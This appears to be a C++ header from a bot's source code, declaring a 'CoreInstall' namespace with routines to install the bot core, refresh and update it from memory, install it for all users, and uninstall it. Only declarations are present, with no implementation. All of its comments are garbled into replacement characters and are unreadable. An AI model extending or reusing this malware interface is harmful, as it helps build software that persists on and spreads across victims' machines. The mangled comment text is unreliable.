/*
  ���������� ����.
*/
#pragma once

#include "..\common\botstatus.h"
#include "..\common\fs.h"

namespace CoreInstall
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ���� � �������.

    IN pathHome  - �������� ����������. �� ������ ��������� �� ����.
    OUT coreFile - ��� �o���� ������������� �����.

    Return       - true - � ������ ������,
                   false - � ������ ������.

    ����� ���������� ������� �������������� �������� coreData.peSettings.
  */
  bool _install(const LPWSTR pathHome, LPWSTR coreFile);

  /*
	����� ���������� ������ � ����� ������ ������ �� ��������.
	
	IN pathHome  - �������� ����������. �� ������ ��������� �� ����.
    OUT coreFile - ��� �o���� ������������� �����.
	IN mem		 - ����� ����� ������.

	Return		 - true - � ������ ������,
				   0 - � ������ ������.
  */
  bool _refresh(const LPWSTR pathHome, LPWSTR coreFile, Fs::MEMFILE* mem);

  /*
    ���������� ������ ��������� �������������, � ��������� ����� ��������� � ��������� coreData.peSettings.
    
    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _loadInstalledData();

  /*
    ������ ����������.

    IN bs        - ������ � ����������� ����.
    IN pathHome  - �������� ����������. �� ������ ��������� �� ����.
    OUT coreFile - ��� ������ ������������� �����.
    IN force     - ����������� ����������, �� ������ �� ������.

    Return       - true - � ������ ������,
                   false - � ������ ������.

    ����� ���������� ������� �������������� �������� coreData.peSettings.
  */
  bool _update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR coreFile, bool force);
  
  /*
    ���������� ������, ������� ������������ ��� ���������� ����� ����.

    OUT bs - �����.
  */
  void _loadUpdateData(BotStatus::VER1 *bs);

  /*
    ��������� ���� �� ��� ���������� �������.  
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _installToAll(void);

  /*
    �������� ���� �� �������� �������.
    
    IN wait - true - ������� ���������� ��������,
              false - �� ������� ���������� ��������.
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _uninstall(bool wait);
};
